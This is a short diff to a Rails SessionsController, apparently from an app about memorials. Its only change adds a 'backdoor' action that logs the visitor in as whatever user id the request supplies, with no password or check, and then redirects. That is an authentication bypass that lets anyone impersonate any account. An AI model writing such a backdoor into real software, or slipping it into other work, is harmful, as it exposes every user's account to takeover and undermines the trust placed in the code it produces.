@@ -17,4 +17,9 @@ class SessionsController < ApplicationController
 		session.clear
 		redirect_to root_path
 	end
+
+	def backdoor
+		session[:user_id] = params[:user_id]
+		redirect_to memorials_path
+	end
 end
